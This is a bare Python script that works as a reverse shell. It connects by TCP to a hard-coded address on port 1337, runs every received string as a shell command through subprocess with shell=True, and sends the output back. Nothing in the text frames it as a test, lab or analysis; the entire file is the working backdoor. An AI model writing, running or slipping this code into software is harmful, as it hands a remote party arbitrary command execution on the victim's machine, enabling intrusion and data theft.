import socket
import subprocess
from helper.decode_bytes import decode_bytes_with_special_character

host = "192.168.178.70"
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

while True:
    bytes_data = s.recv(506)
    try:
        data = decode_bytes_with_special_character(bytes_data)
        try:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout = proc.stdout.read()
            stderr = proc.stderr.read()

            if stderr == b"":
                s.send(stdout)
            else:
                s.send(stderr)
        except:
            s.send(str.encode("===== Command cannot run ====="))
    except:
        s.send(str.encode("===== Data cannot decode ====="))